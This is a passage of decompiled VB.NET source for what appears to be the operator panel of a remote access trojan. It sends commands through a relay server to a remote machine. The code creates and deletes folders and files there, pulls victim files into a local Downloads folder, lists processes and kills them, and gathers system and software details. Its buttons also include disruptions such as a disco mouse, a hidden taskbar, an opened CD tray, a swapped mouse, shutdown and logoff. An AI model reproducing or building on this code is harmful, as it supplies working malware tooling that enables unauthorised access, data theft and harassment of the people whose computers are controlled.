            Loop
        End Sub

        Public Sub checksharedfiles()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Operators.ConditionalCompareObjectEqual(Me.server.getlogs(host, file, "_share"), "FileUploadCompleted", False) Then
                        Dim client As New WebClient
                        MyProject.Computer.FileSystem.CreateDirectory((FileSystem.CurDir & "\Downloads\"))
                        MyProject.Computer.FileSystem.CreateDirectory((FileSystem.CurDir & "\Downloads\" & file & "\"))
                        client.DownloadFile((host & "/sharedfiles/" & Me.todownloadfile), String.Concat(New String() { FileSystem.CurDir, "\Downloads\", file, "\", Me.todownloadfile }))
                        Me.server.delcmd(host, ("./sharedfiles/" & Me.todownloadfile))
                        Me.FlatStatusBar1.Text = "File downloaded successfully!"
                    End If
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Private Sub CopyFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                    Interaction.MsgBox("Please select a File!", MsgBoxStyle.Critical, Nothing)
                Else
                    Me.oldpath = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Me.nam = Me.ListView1.SelectedItems.Item(0).Text
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Copy1f")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Copy2f")
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Move1f")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Move2f")
                    Me.rightclick_nothing.Items.RemoveByKey("Copy3f")
                    Me.rightclick_nothing.Items.RemoveByKey("Move3f")
                    Dim item As New ToolStripMenuItem("Paste File here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.document__arrow, _
                        .Name = "Copy1f" _
                    }
                    Me.rightclick_filemanagerfolders.Items.Add(item)
                    AddHandler item.Click, New EventHandler(AddressOf Me._Lambda$__9)
                    Dim item2 As New ToolStripMenuItem("Paste File here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.document__arrow, _
                        .Name = "Copy2f" _
                    }
                    Me.rightclick_filemanagerfiles.Items.Add(item2)
                    AddHandler item2.Click, New EventHandler(AddressOf Me._Lambda$__10)
                    Dim item3 As New ToolStripMenuItem("Paste File here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.document__arrow, _
                        .Name = "Copy3f" _
                    }
                    Me.rightclick_nothing.Items.Add(item3)
                    AddHandler item3.Click, New EventHandler(AddressOf Me._Lambda$__11)
                    Me.FlatStatusBar1.Text = "Copying File..."
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CopyThisFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "0") Then
                    Interaction.MsgBox("Please select a Folder!", MsgBoxStyle.Critical, Nothing)
                Else
                    Me.oldpath = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Me.nam = Me.ListView1.SelectedItems.Item(0).Text
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Copy1")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Copy2")
                    Me.rightclick_filemanagerfolders.Items.RemoveByKey("Move1")
                    Me.rightclick_filemanagerfiles.Items.RemoveByKey("Move2")
                    Me.rightclick_nothing.Items.RemoveByKey("Copy3")
                    Me.rightclick_nothing.Items.RemoveByKey("Move3")
                    Dim item As New ToolStripMenuItem("Paste Folder here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.folder__arrow, _
                        .Name = "Copy1" _
                    }
                    Me.rightclick_filemanagerfolders.Items.Add(item)
                    AddHandler item.Click, New EventHandler(AddressOf Me._Lambda$__3)
                    Dim item2 As New ToolStripMenuItem("Paste Folder here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.folder__arrow, _
                        .Name = "Copy2" _
                    }
                    Me.rightclick_filemanagerfiles.Items.Add(item2)
                    AddHandler item2.Click, New EventHandler(AddressOf Me._Lambda$__4)
                    Dim item3 As New ToolStripMenuItem("Paste Folder here") With { _
                        .BackColor = Color.FromArgb(&H2E, &H2E, &H2E), _
                        .ForeColor = Color.White, _
                        .Image = Resources.folder__arrow, _
                        .Name = "Copy3" _
                    }
                    Me.rightclick_nothing.Items.Add(item3)
                    AddHandler item3.Click, New EventHandler(AddressOf Me._Lambda$__5)
                    Me.FlatStatusBar1.Text = "Copying Directory..."
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreateNewFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str2 As String = Interaction.InputBox("Please specify a Name for the folder you want to create!", "New Directory", "", -1, -1)
                If (str2 = "") Then
                    Interaction.MsgBox("No Folder was created, due empty name!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("mkdir|" & Me.path & str2), host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An error occured!"
                    Else
                        Me.FlatStatusBar1.Text = "New Folder was created successfully!"
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreateNewFileToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim path As String
                MyProject.Forms.newfile.connected = Me.connected
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                MyProject.Forms.newfile.path = path
                MyProject.Forms.newfile.Show
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreateNewFileToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim path As String
                MyProject.Forms.newfile.connected = Me.connected
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                MyProject.Forms.newfile.path = path
                MyProject.Forms.newfile.Show
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreateNewFileToolStripMenuItem3_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim path As String
                MyProject.Forms.newfile.connected = Me.connected
                Try 
                    If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                        path = (Me.path & Me.ListView1.SelectedItems.Item(0).Text)
                    Else
                        path = Me.path
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    path = Me.path
                    ProjectData.ClearProjectError
                End Try
                MyProject.Forms.newfile.path = path
                MyProject.Forms.newfile.Show
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreateNewFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str2 As String = Interaction.InputBox("Please specify a Name for the folder you want to create!", "New Directory", "", -1, -1)
                If (str2 = "") Then
                    Interaction.MsgBox("No Folder was created, due empty name!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("mkdir|" & Me.path & str2), host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An error occured!"
                    Else
                        Me.FlatStatusBar1.Text = "New Folder was created successfully!"
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub CreateNewFolderToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str2 As String = Interaction.InputBox("Please specify a Name for the folder you want to create!", "New Directory", "", -1, -1)
                If (str2 = "") Then
                    Interaction.MsgBox("No Folder was created, due empty name!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("mkdir|" & Me.path & str2), host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An error occured!"
                    Else
                        Me.FlatStatusBar1.Text = "New Folder was created successfully!"
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub DeleteFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                    Interaction.MsgBox("Please select a File!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("rmfile|" & Me.path & Me.ListView1.SelectedItems.Item(0).Text), host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An error occured!"
                    Else
                        Me.FlatStatusBar1.Text = "File was removed successfully!"
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub DeleteFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "0") Then
                    Interaction.MsgBox("Please select a Folder!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("rmdir|" & Me.path & Me.ListView1.SelectedItems.Item(0).Text), host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An error occured!"
                    Else
                        Me.FlatStatusBar1.Text = "Directory was removed successfully!"
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub DownloadFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.todownloadfile = Me.ListView1.SelectedItems.Item(0).Text
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("sharefile|" & Me.path & Me.todownloadfile), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Downloading File..."
                    Me.g = New Thread(New ThreadStart(AddressOf Me.checksharedfiles))
                    Me.g.Start
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(SystemInformation))
            Dim node As New TreeNode("Computer Name: ")
            Dim node12 As New TreeNode("Username: ")
            Dim node13 As New TreeNode("Virtual Screen Width: ")
            Dim node14 As New TreeNode("Virtual Screen Height: ")
            Dim node15 As New TreeNode("Available Physical Memory: ")
            Dim node16 As New TreeNode("Available Virtual Memory: ")
            Dim node17 As New TreeNode("OS Full Name: ")
            Dim node18 As New TreeNode("OS Platform: ")
            Dim node19 As New TreeNode("OS Version: ")
            Dim node2 As New TreeNode("Total Physical Memory: ")
            Dim node3 As New TreeNode("Total Virtual Memory: ")
            Dim node4 As New TreeNode("Battery Charge Status: ")
            Dim node5 As New TreeNode("Battery Full Lifetime: ")
            Dim node6 As New TreeNode("Battery Life Percent: ")
            Dim node7 As New TreeNode("Battery Life Remaining: ")
            Dim node8 As New TreeNode("CPU Info: ")
            Dim node9 As New TreeNode("GPU Name: ")
            Dim node10 As New TreeNode("Uptime: ")
            Dim node11 As New TreeNode("Computer Information", New TreeNode() { node, node12, node13, node14, node15, node16, node17, node18, node19, node2, node3, node4, node5, node6, node7, node8, node9, node10 })
            Me.rightclickprocess = New ContextMenuStrip(Me.components)
            Me.RefreshToolStripMenuItem = New ToolStripMenuItem
            Me.NewProcessToolStripMenuItem = New ToolStripMenuItem
            Me.KillProcessToolStripMenuItem = New ToolStripMenuItem
            Me.ImageList_Info = New ImageList(Me.components)
            Me.rightclicksystem = New ContextMenuStrip(Me.components)
            Me.ToolStripMenuItem1 = New ToolStripMenuItem
            Me.rightclick_IS = New ContextMenuStrip(Me.components)
            Me.ToolStripMenuItem2 = New ToolStripMenuItem
            Me.ImageList_FileManager = New ImageList(Me.components)
            Me.rightclick_filemanagerfolders = New ContextMenuStrip(Me.components)
            Me.RefreshToolStripMenuItem1 = New ToolStripMenuItem
            Me.CreateNewFolderToolStripMenuItem = New ToolStripMenuItem
            Me.CreateNewFileToolStripMenuItem1 = New ToolStripMenuItem
            Me.DeleteFolderToolStripMenuItem = New ToolStripMenuItem
            Me.RenameFolderToolStripMenuItem = New ToolStripMenuItem
            Me.CopyThisFolderToolStripMenuItem = New ToolStripMenuItem
            Me.MoveThisFolderToolStripMenuItem = New ToolStripMenuItem
            Me.UploadFileToolStripMenuItem2 = New ToolStripMenuItem
            Me.rightclick_filemanagerfiles = New ContextMenuStrip(Me.components)
            Me.RefreshToolStripMenuItem2 = New ToolStripMenuItem
            Me.CreateNewFileToolStripMenuItem = New ToolStripMenuItem
            Me.CreateNewFileToolStripMenuItem2 = New ToolStripMenuItem
            Me.DeleteFileToolStripMenuItem = New ToolStripMenuItem
            Me.RenameFileToolStripMenuItem = New ToolStripMenuItem
            Me.CopyFileToolStripMenuItem = New ToolStripMenuItem
            Me.MoveFileToolStripMenuItem = New ToolStripMenuItem
            Me.DownloadFileToolStripMenuItem = New ToolStripMenuItem
            Me.UploadFileToolStripMenuItem1 = New ToolStripMenuItem
            Me.rightclick_nothing = New ContextMenuStrip(Me.components)
            Me.RefreshToolStripMenuItem3 = New ToolStripMenuItem
            Me.CreateNewFolderToolStripMenuItem1 = New ToolStripMenuItem
            Me.CreateNewFileToolStripMenuItem3 = New ToolStripMenuItem
            Me.UploadFileToolStripMenuItem = New ToolStripMenuItem
            Me.FormSkin1 = New FormSkin
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.DotNetBarTabcontrol1 = New DotNetBarTabcontrol
            Me.TabPage1 = New TabPage
            Me.TreeView1 = New TreeView
            Me.TabPage2 = New TabPage
            Me.listprocess = New ListView
            Me.ColumnHeader1 = New ColumnHeader
            Me.ColumnHeader2 = New ColumnHeader
            Me.ColumnHeader3 = New ColumnHeader
            Me.ColumnHeader4 = New ColumnHeader
            Me.ColumnHeader5 = New ColumnHeader
            Me.FlatStatusBarprocess = New FlatStatusBar
            Me.TabPage3 = New TabPage
            Me.FlatGroupBox2 = New FlatGroupBox
            Me.btn_send = New FlatStickyButton
            Me.btn_test = New FlatStickyButton
            Me.ComboBox2 = New FlatComboBox
            Me.ComboBox1 = New FlatComboBox
            Me.FlatLabel3 = New FlatLabel
            Me.FlatLabel2 = New FlatLabel
            Me.rtb_prompt = New RichTextBox
            Me.Prompt = New FlatLabel
            Me.tb_title = New FlatTextBox
            Me.FlatLabel1 = New FlatLabel
            Me.FlatGroupBox1 = New FlatGroupBox
            Me.btn_stopdiscomouse = New FlatButton
            Me.btn_startdiscomouse = New FlatButton
            Me.btn_logoff = New FlatButton
            Me.btn_shutdown = New FlatButton
            Me.btn_restart = New FlatButton
            Me.btn_changewp = New FlatButton
            Me.btn_openweb = New FlatButton
            Me.btn_speak = New FlatButton
            Me.btn_undo = New FlatButton
            Me.btn_swap = New FlatButton
            Me.btn_closecd = New FlatButton
            Me.btn_opencd = New FlatButton
            Me.btn_showdi = New FlatButton
            Me.btn_hidedi = New FlatButton
            Me.btn_showtb = New FlatButton
            Me.btn_hidetb = New FlatButton
            Me.TabPage4 = New TabPage
            Me.FlatStatusBar_IS = New FlatStatusBar
            Me.ListBox_Software = New ListBox
            Me.TabPage5 = New TabPage
            Me.tb_path = New TextBox
            Me.ListView1 = New ListView
            Me.ColumnHeader6 = New ColumnHeader
            Me.ColumnHeader7 = New ColumnHeader
            Me.ColumnHeader8 = New ColumnHeader
            Me.ColumnHeader9 = New ColumnHeader
            Me.ColumnHeader10 = New ColumnHeader
            Me.PictureBox1 = New PictureBox
            Me.cb_drive = New FlatComboBox
            Me.TabPage6 = New TabPage
            Me.Label1 = New Label
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatCloseSY1 = New FlatCloseSY
            Me.rightclickprocess.SuspendLayout
            Me.rightclicksystem.SuspendLayout
            Me.rightclick_IS.SuspendLayout
            Me.rightclick_filemanagerfolders.SuspendLayout
            Me.rightclick_filemanagerfiles.SuspendLayout
            Me.rightclick_nothing.SuspendLayout
            Me.FormSkin1.SuspendLayout
            Me.DotNetBarTabcontrol1.SuspendLayout
            Me.TabPage1.SuspendLayout
            Me.TabPage2.SuspendLayout
            Me.TabPage3.SuspendLayout
            Me.FlatGroupBox2.SuspendLayout
            Me.FlatGroupBox1.SuspendLayout
            Me.TabPage4.SuspendLayout
            Me.TabPage5.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.TabPage6.SuspendLayout
            Me.SuspendLayout
            Me.rightclickprocess.Items.AddRange(New ToolStripItem() { Me.RefreshToolStripMenuItem, Me.NewProcessToolStripMenuItem, Me.KillProcessToolStripMenuItem })
            Me.rightclickprocess.Name = "ContextMenuStrip1"
            Dim size2 As New Size(&H8E, 70)
            Me.rightclickprocess.Size = size2
            Me.RefreshToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RefreshToolStripMenuItem.ForeColor = Color.White
            Me.RefreshToolStripMenuItem.Image = DirectCast(manager.GetObject("RefreshToolStripMenuItem.Image"), Image)
            Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
            size2 = New Size(&H8D, &H16)
            Me.RefreshToolStripMenuItem.Size = size2
            Me.RefreshToolStripMenuItem.Text = "Refresh"
            Me.NewProcessToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.NewProcessToolStripMenuItem.ForeColor = Color.White
            Me.NewProcessToolStripMenuItem.Image = DirectCast(manager.GetObject("NewProcessToolStripMenuItem.Image"), Image)
            Me.NewProcessToolStripMenuItem.Name = "NewProcessToolStripMenuItem"
            size2 = New Size(&H8D, &H16)
            Me.NewProcessToolStripMenuItem.Size = size2
            Me.NewProcessToolStripMenuItem.Text = "New Process"
            Me.KillProcessToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.KillProcessToolStripMenuItem.ForeColor = Color.White
            Me.KillProcessToolStripMenuItem.Image = DirectCast(manager.GetObject("KillProcessToolStripMenuItem.Image"), Image)
            Me.KillProcessToolStripMenuItem.Name = "KillProcessToolStripMenuItem"
            size2 = New Size(&H8D, &H16)
            Me.KillProcessToolStripMenuItem.Size = size2
            Me.KillProcessToolStripMenuItem.Text = "Kill Process"
            Me.ImageList_Info.ImageStream = DirectCast(manager.GetObject("ImageList_Info.ImageStream"), ImageListStreamer)
            Me.ImageList_Info.TransparentColor = Color.Transparent
            Me.ImageList_Info.Images.SetKeyName(0, "alarm-clock.png")
            Me.ImageList_Info.Images.SetKeyName(1, "application-monitor.png")
            Me.ImageList_Info.Images.SetKeyName(2, "battery.png")
            Me.ImageList_Info.Images.SetKeyName(3, "battery-charge.png")
            Me.ImageList_Info.Images.SetKeyName(4, "battery--exclamation.png")
            Me.ImageList_Info.Images.SetKeyName(5, "graphic-card.png")
            Me.ImageList_Info.Images.SetKeyName(6, "information.png")
            Me.ImageList_Info.Images.SetKeyName(7, "information-white.png")
            Me.ImageList_Info.Images.SetKeyName(8, "user.png")
            Me.ImageList_Info.Images.SetKeyName(9, "resource-monitor.png")
            Me.ImageList_Info.Images.SetKeyName(10, "processor.png")
            Me.ImageList_Info.Images.SetKeyName(11, "monitor.png")
            Me.ImageList_Info.Images.SetKeyName(12, "memory.png")
            Me.ImageList_Info.Images.SetKeyName(13, "selection.png")
            Me.ImageList_Info.Images.SetKeyName(14, "computer.png")
            Me.rightclicksystem.Items.AddRange(New ToolStripItem() { Me.ToolStripMenuItem1 })
            Me.rightclicksystem.Name = "ContextMenuStrip1"
            size2 = New Size(&H72, &H1A)
            Me.rightclicksystem.Size = size2
            Me.ToolStripMenuItem1.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.ToolStripMenuItem1.ForeColor = Color.White
            Me.ToolStripMenuItem1.Image = DirectCast(manager.GetObject("ToolStripMenuItem1.Image"), Image)
            Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
            size2 = New Size(&H71, &H16)
            Me.ToolStripMenuItem1.Size = size2
            Me.ToolStripMenuItem1.Text = "Refresh"
            Me.rightclick_IS.Items.AddRange(New ToolStripItem() { Me.ToolStripMenuItem2 })
            Me.rightclick_IS.Name = "ContextMenuStrip1"
            size2 = New Size(&H72, &H1A)
            Me.rightclick_IS.Size = size2
            Me.ToolStripMenuItem2.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.ToolStripMenuItem2.ForeColor = Color.White
            Me.ToolStripMenuItem2.Image = DirectCast(manager.GetObject("ToolStripMenuItem2.Image"), Image)
            Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
            size2 = New Size(&H71, &H16)
            Me.ToolStripMenuItem2.Size = size2
            Me.ToolStripMenuItem2.Text = "Refresh"
            Me.ImageList_FileManager.ImageStream = DirectCast(manager.GetObject("ImageList_FileManager.ImageStream"), ImageListStreamer)
            Me.ImageList_FileManager.TransparentColor = Color.Transparent
            Me.ImageList_FileManager.Images.SetKeyName(0, "folder-horizontal.png")
            Me.ImageList_FileManager.Images.SetKeyName(1, "application-blue.png")
            Me.ImageList_FileManager.Images.SetKeyName(2, "blue-document-code.png")
            Me.ImageList_FileManager.Images.SetKeyName(3, "blue-document-excel.png")
            Me.ImageList_FileManager.Images.SetKeyName(4, "blue-document-flash-movie.png")
            Me.ImageList_FileManager.Images.SetKeyName(5, "blue-document-globe.png")
            Me.ImageList_FileManager.Images.SetKeyName(6, "blue-document-illustrator.png")
            Me.ImageList_FileManager.Images.SetKeyName(7, "blue-document-music.png")
            Me.ImageList_FileManager.Images.SetKeyName(8, "blue-document-pdf.png")
            Me.ImageList_FileManager.Images.SetKeyName(9, "blue-document-photoshop.png")
            Me.ImageList_FileManager.Images.SetKeyName(10, "blue-document-php.png")
            Me.ImageList_FileManager.Images.SetKeyName(11, "blue-document-powerpoint.png")
            Me.ImageList_FileManager.Images.SetKeyName(12, "blue-document-visual-studio.png")
            Me.ImageList_FileManager.Images.SetKeyName(13, "blue-document-word.png")
            Me.ImageList_FileManager.Images.SetKeyName(14, "blue-document-xaml.png")
            Me.ImageList_FileManager.Images.SetKeyName(15, "briefcase.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H10, "database.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H11, "document.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H12, "document-outlook.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H13, "film.png")
            Me.ImageList_FileManager.Images.SetKeyName(20, "folder-zipper.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H15, "image.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H16, "script.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H17, "folder-horizontal-up.png")
            Me.ImageList_FileManager.Images.SetKeyName(&H18, "document-text.png")
            Me.rightclick_filemanagerfolders.BackColor = SystemColors.Control
            Me.rightclick_filemanagerfolders.Items.AddRange(New ToolStripItem() { Me.RefreshToolStripMenuItem1, Me.CreateNewFolderToolStripMenuItem, Me.CreateNewFileToolStripMenuItem1, Me.DeleteFolderToolStripMenuItem, Me.RenameFolderToolStripMenuItem, Me.CopyThisFolderToolStripMenuItem, Me.MoveThisFolderToolStripMenuItem, Me.UploadFileToolStripMenuItem2 })
            Me.rightclick_filemanagerfolders.Name = "rightclick_filemanager"
            size2 = New Size(&HAC, 180)
            Me.rightclick_filemanagerfolders.Size = size2
            Me.RefreshToolStripMenuItem1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RefreshToolStripMenuItem1.ForeColor = Color.White
            Me.RefreshToolStripMenuItem1.Image = DirectCast(manager.GetObject("RefreshToolStripMenuItem1.Image"), Image)
            Me.RefreshToolStripMenuItem1.Name = "RefreshToolStripMenuItem1"
            size2 = New Size(&HAB, &H16)
            Me.RefreshToolStripMenuItem1.Size = size2
            Me.RefreshToolStripMenuItem1.Text = "Refresh"
            Me.CreateNewFolderToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CreateNewFolderToolStripMenuItem.ForeColor = Color.White
            Me.CreateNewFolderToolStripMenuItem.Image = DirectCast(manager.GetObject("CreateNewFolderToolStripMenuItem.Image"), Image)
            Me.CreateNewFolderToolStripMenuItem.Name = "CreateNewFolderToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.CreateNewFolderToolStripMenuItem.Size = size2
            Me.CreateNewFolderToolStripMenuItem.Text = "Create New Folder"
            Me.CreateNewFileToolStripMenuItem1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CreateNewFileToolStripMenuItem1.ForeColor = Color.White
            Me.CreateNewFileToolStripMenuItem1.Image = DirectCast(manager.GetObject("CreateNewFileToolStripMenuItem1.Image"), Image)
            Me.CreateNewFileToolStripMenuItem1.Name = "CreateNewFileToolStripMenuItem1"
            size2 = New Size(&HAB, &H16)
            Me.CreateNewFileToolStripMenuItem1.Size = size2
            Me.CreateNewFileToolStripMenuItem1.Text = "Create New File"
            Me.DeleteFolderToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.DeleteFolderToolStripMenuItem.ForeColor = Color.White
            Me.DeleteFolderToolStripMenuItem.Image = DirectCast(manager.GetObject("DeleteFolderToolStripMenuItem.Image"), Image)
            Me.DeleteFolderToolStripMenuItem.Name = "DeleteFolderToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.DeleteFolderToolStripMenuItem.Size = size2
            Me.DeleteFolderToolStripMenuItem.Text = "Delete Folder"
            Me.RenameFolderToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RenameFolderToolStripMenuItem.ForeColor = Color.White
            Me.RenameFolderToolStripMenuItem.Image = DirectCast(manager.GetObject("RenameFolderToolStripMenuItem.Image"), Image)
            Me.RenameFolderToolStripMenuItem.Name = "RenameFolderToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.RenameFolderToolStripMenuItem.Size = size2
            Me.RenameFolderToolStripMenuItem.Text = "Rename Folder"
            Me.CopyThisFolderToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.CopyThisFolderToolStripMenuItem.ForeColor = Color.White
            Me.CopyThisFolderToolStripMenuItem.Image = DirectCast(manager.GetObject("CopyThisFolderToolStripMenuItem.Image"), Image)
            Me.CopyThisFolderToolStripMenuItem.Name = "CopyThisFolderToolStripMenuItem"
            size2 = New Size(&HAB, &H16)
            Me.CopyThisFolderToolStripMenuItem.Size = size2
            Me.CopyThisFolderToolStripMenuItem.Text = "Copy this Folder"
            Me.MoveThisFolderToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.MoveThisFolderToolStripMenuItem.ForeColor = Color.White
